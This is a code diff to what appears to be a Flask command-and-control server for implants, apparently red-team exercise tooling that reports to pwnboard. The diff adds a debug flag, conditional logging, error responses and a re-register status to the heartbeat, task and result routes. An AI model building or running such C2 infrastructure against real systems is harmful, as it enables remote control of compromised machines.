@@ -14,7 +14,7 @@ app = Flask(__name__)
 
 
 #Configuration dictionary
-config = {"upload_dir": "uploads", "show_requests": False}
+config = {"upload_dir": "uploads", "show_requests": False,"debug":False}
 
 # SQLite database configuration
 app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///c2.db'
@@ -23,7 +23,7 @@ db = SQLAlchemy(app)
 
 #logging config
 log = logging.getLogger('werkzeug')
-if config['show_requests']:
+if config['show_requests'] or config['debug']:
     log.setLevel(logging.INFO)
 else:
     log.setLevel(logging.ERROR)
@@ -132,14 +132,15 @@ def submit_results():
         update_timestamp(agent_id)
         return jsonify({'status': 'success'})
     except:
-        pass
+        return jsonify({'status': 'failed'}), 400
 
 @app.route('/heartbeat', methods=['POST'])
 def heartbeat():
     try:
         data = request.json
         ip = data['ip']
-        print(f"Received heartbeat from {ip}")
+        if config['debug']:
+            print(f"Received heartbeat from {ip}")
         update_pwnboard(ip)
         update_timestamp(ip)
         return jsonify({'status': 'success'})
@@ -160,7 +161,8 @@ def get_task():
                 'task_id': task.id
             }
             return jsonify(task_data),200
-    return jsonify({"status": "No tasks"}), 204
+        return jsonify({"status": "No tasks"}), 204
+    return jsonify({"status": "Must re-register"}), 418
 
 @app.route('/download/<filename>', methods=['GET'])
 def download_file(filename):
